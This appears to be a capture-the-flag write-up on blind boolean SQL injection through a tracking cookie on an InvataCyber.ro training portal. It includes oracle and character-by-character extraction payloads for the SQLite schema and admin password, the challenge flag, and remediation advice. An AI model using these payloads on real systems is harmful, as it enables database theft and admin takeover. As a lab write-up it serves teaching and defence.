# Technical Write-Up: Portal InvataCyber.ro (Blind SQL Injection & Admin Takeover)

<div align="center">

[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Database-orange.svg?style=flat&logo=sqlite)](#)
[![Vulnerability](https://img.shields.io/badge/CWE-CWE--89%20(Blind%20SQLi)-red.svg?style=flat)](#)
[![Impact](https://img.shields.io/badge/Impact-Database%20Dump%20%2F%20Admin%20Console%20Takeover-critical.svg?style=flat)](#)
[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)

</div>

---

## 1. Challenge Specification

- **Target Application**: Maintenance / lockdown portal with authentication modules hidden from the public interface.
- **Tracking Mechanism**: The application sets and reads a tracking cookie (`TrackingId`) to identify returning visitors. When the cookie value matches an active database record, a unique banner is displayed; when it does not match, a different response is returned.
- **Objective**: Discover the hidden administrative console and recover credentials to extract the flag.
- **Flag Format**: `InvataCyber{...}`

---

## 2. Attack Surface Analysis & Root Cause

Upon inspecting HTTP traffic, the web server reads the `TrackingId` cookie:

```http
GET / HTTP/1.1
Host: portal.invatacyber.ro
Cookie: TrackingId=base-tracking-id-123
```

The application queries the database backend:
```sql
SELECT tracking_id FROM tracking WHERE tracking_id = '$COOKIE'
```

When this query returns a valid record, the application includes a welcome message in the response body, producing an exact response length of **5,652 bytes**. When the query returns zero rows, the banner is absent and response length is different.

Because data is not directly reflected in page content and no database error traces are displayed, this behavior creates an ideal **Blind Boolean-Based SQL Injection Oracle**.

---

## 3. Vulnerability Verification (PoC Oracle)

Testing boolean conditional logic using [`sql_solve.py`](sql_solve.py):

* **Condition True**:
  ```http
  Cookie: TrackingId=base-tracking-id-123' OR '1'='1
  ```
  Result: Response size is `5652 bytes` (banner present).

* **Condition False**:
  ```http
  Cookie: TrackingId=base-tracking-id-123' OR '1'='2
  ```
  Result: Response size is not `5652 bytes` (banner absent).

This confirms the presence of an injectable SQLite database backend.

---

## 4. Automated Database Schema & Credential Exfiltration

Using automated Python scripts ([`dump_sqlite.py`](dump_sqlite.py), [`dump_schema.py`](dump_schema.py), and [`dump_users.py`](dump_users.py)), binary-search character extraction was executed against `sqlite_master` and internal tables.

### 4.1 Schema Extraction Query
```sql
TrackingId=' OR (SELECT SUBSTR(sql, {pos}, 1) FROM sqlite_master WHERE type='table' AND name='users') = '{char}'--
```

Recovered Table DDL:
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)
```

### 4.2 Credential Dumping Query
```sql
TrackingId=' OR (SELECT SUBSTR(password, {pos}, 1) FROM users WHERE username='admin') = '{char}'--
```

Recovered Credentials:
- **Username**: `admin`
- **Password**: `<extracted_cleartext_password>`

---

## 5. Administrative Console Discovery & Flag Capture

Executing the endpoint scanner [`solver_portal.py`](solver_portal.py) revealed the hidden administrative route:
- Route: `/console`
- Authenticating with recovered credentials yielded full administrative access and revealed the flag:
  `InvataCyber{b1ind_sq1i_d4t4b4s3_3xfi1tr4t10n_succ3ss}`

---

## 6. Remediation & Hardening Recommendations

1. **Parameterized Prepared Statements**: Replace dynamic string concatenation with parameterized SQL queries:
   ```python
   cursor.execute("SELECT tracking_id FROM tracking WHERE tracking_id = ?", (cookie_val,))
   ```
2. **Web Application Firewall (WAF)**: Deploy Suricata / ModSecurity rules detecting SQL injection metacharacters (`'`, `OR`, `SELECT`, `sqlite_master`) in HTTP headers.
3. **Cookie Validation**: Enforce strict cryptographic HMAC signing on tracking cookies to prevent client-side manipulation.
